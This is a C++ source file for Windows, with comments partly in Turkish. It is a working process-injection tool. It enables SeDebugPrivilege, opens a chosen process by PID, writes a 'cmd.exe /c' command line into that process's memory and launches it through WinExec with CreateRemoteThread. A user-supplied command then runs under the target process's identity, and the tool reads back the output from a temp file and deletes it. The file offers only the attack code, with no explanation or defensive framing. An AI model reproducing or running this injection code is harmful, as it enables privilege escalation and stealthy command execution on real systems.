#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <fstream>
#include <tlhelp32.h>
#define _CRT_SECURE_NO_WARNINGS

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}

int main(int argc, char** argv) {

	if (argc < 3) {
		printf("Usage: %s PID COMMAND\n", argv[0]);
		return -1;
	}

	// Grab PID and command from command line arguments
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID_TO_IMPERSONATE);
	if (hProcess == NULL)
	{
		std::cout << "[-] Failed Open Process, error:  " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return 1;
	}
	

	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		
		CloseHandle(hToken);
		return 1;
	}
	

	const wchar_t* privs[] = { L"SeDebugPrivilege" };

	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE)) //(LPCTSTR)privs
	{
		
	}

	// Adım 2: Hedef işlem için bellek tahsis et
	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteMem == NULL)
	{
		
		CloseHandle(hProcess);
		return 1;
	}
	

	// Adım 3: Payload'ı hedef işlemin bellek alanına yaz
	const char* payload = "C:\\windows\\system32\\cmd.exe /c ";
	char command[MAX_PATH];
	sprintf_s(command, sizeof(command), "%s %s > C:\\Windows\\Temp\\output.txt 2>&1", payload, argv[2]);

	if (!WriteProcessMemory(hProcess, remoteMem, command, strlen(command) + 1, NULL))
	{
		
		CloseHandle(hProcess);
		return 1;
	}
	

	// Adım 4: Hedef işlemde uzaktan iş parçacığı oluşturarak rutini çağır
	LPTHREAD_START_ROUTINE pThreadProc = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WinExec"));
	if (pThreadProc == NULL)
	{
		
		return 1;
	}
	
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, remoteMem, 0, NULL);
	if (hThread == NULL)
	{
	
		CloseHandle(hProcess);
		return 1;
	}
	else {
		WaitForSingleObject(hThread, INFINITE);
		
	}

	if (remoteMem != NULL)
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);

	// İşlemler tamamlandı, kapatma
	if (hProcess != NULL)
		CloseHandle(hProcess);
	if (hToken != NULL)
		CloseHandle(hToken);
	if (currentTokenHandle != NULL)
		CloseHandle(currentTokenHandle);

	Sleep(3000);

	system("type C:\\Windows\\Temp\\output.txt");
	system("del C:\\Windows\\Temp\\output.txt");

	return 0;
}
